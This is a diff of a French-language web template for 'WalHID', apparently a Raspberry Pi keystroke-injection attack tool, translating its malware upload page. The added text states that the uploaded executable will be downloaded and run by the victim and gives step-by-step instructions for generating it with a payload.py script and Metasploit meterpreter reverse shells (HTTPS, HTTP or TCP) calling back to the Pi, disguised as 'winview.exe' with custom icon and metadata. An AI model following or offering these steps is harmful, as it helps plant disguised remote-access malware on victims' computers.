@@ -1,12 +1,14 @@
 {% extends "base.html" %}
-{% block title %}Payload upload{% endblock %}
+{% block title %}Téléversement du logiciel malveillant - WalHID{% endblock %}
 {% block content %}
-    <h2>Payload upload </h2>
+    <h2>Téléversion du logiciel malveillant </h2>
     <hr />
+
+    <p>Ce logiciel sera téléchargé puis exécuté par la victime.</p>
 
     {% if exists and not uploaded %}
     <div class="alert alert-info" role="alert">
-        <strong>Current payload : <a href="{{ link }}">Click to download</a></strong>
+        Un logiciel actuellement est actuellement téléchargeable. <a href="{{ link }}" class="alert-link">Cliquez pour télécharger</a>
     </div>
     {% endif %}
 
@@ -23,17 +25,57 @@
         </script>
     {% endif %}
 
-    <form action="" method="POST" enctype="multipart/form-data">
-		<div class="form-group">
-          <label for="">Payload binary</label>
+    <form action="" class="form-inline" method="POST" enctype="multipart/form-data" style="border: 1px solid #ccc;
+    padding: 20px;">
+      <div class="form-group">
+          <label for="">Logiciel malveillant (.exe)</label>
           <input type="file" class="form-control-file" name="payload_binary" id="payload_binary" placeholder="" aria-describedby="fileHelpId">
-          <small id="fileHelpId" class="form-text text-muted">A payload binary can be generated using the script <code>payload.py</code> in <code>genpayload</code> directory.</small>
-        </div>
+      </div>
 
-        {% csrf_token %}
+      {% csrf_token %}
 
-        <button type="submit" class="btn btn-primary">Upload</button>
-	</form>
+      <button type="submit" class="btn btn-primary">Envoyer</button>
+
+        
+    </form>
+
+    <h4 class="mt-5 mb-3">Générer un logiciel malveillant WalHID</h4>
+
+    <p>WalHID inclut un script de génération de logiciel malveillant situé dans le répertoire <code>genpayload/</code>.</p>
+    <p><strong>Dépendances</strong></p>
+    <ul>
+      <li>Python 2.7</li>
+      <li>Metasploit Framework (version 5)</li>
+      <li>mingw-w64 version 6</li>
+      <li>strip (capable de générer un format pe-x86_64) (par défaut sur la plupart des distributions Linux)</li>
+      <li>gcc version 6</li>
+    </ul>
+
+    <p><strong>Génération</strong></p>
+    <ol>
+      <li>Se rendre dans le dossier genpayload<br/><code>cd genpayload</code></li>
+      <li>Rendre exécutable le fichier <var>payload.py</var><br/><code>chmod u+x payload.py</code></li>
+      <li>Exécuter le script <var>payload.py</var><br/>
+        <code>./payload.py [-p PAYLOAD] [-o OUTPUT] [-r RESOURCE] lhost lport</code>
+        <ul>
+          <li>lhost : L'adresse IP de la Raspberry Pi. 192.168.4.1 par défaut.</li>
+          <li>lport : Le port sur lequel écoute le gestionnaire de la Raspberry Pi. 4444 par défaut.</li>
+          <li>PAYLOAD : le type de charge à utiliser qui correspond au canal de communication utilisé. 
+            Au choix : <ul>
+            <li><var>windows/x64/meterpreter/reverse_https</var> correspond à HTTPS (par défaut)</li>
+            <li><var>windows/x64/meterpreter/reverse_http</var> correspond à HTTP</li>
+            <li><var>windows/x64/meterpreter/reverse_tcp</var> correspond à TCP</li>
+          </ul></li>
+          <li>OUTPUT : nom du fichier exécutable généré. winview.exe par défaut.</li>
+          <li>RESOURCE : nom du fichier de ressources (permet d'ajouter des métadonnées et un icône à l'exécutable). ressources.rc par défaut.</li>
+        </ul> 
+      </li>
+      <li>Téléverser le fichier .exe généré sur cette page.</li>
+    </ol>
+
+    <p><strong>Personnalisation</strong></p>
+    Vous pouvez aisément modifier le fichier <code>ressources.rc</code> qui définit les métadonnées du programme. Vous pouvez également modifier l'icône en modifiant le fichier <code>icon.ico</code> de ce répertoire.
+    
 
     
 	
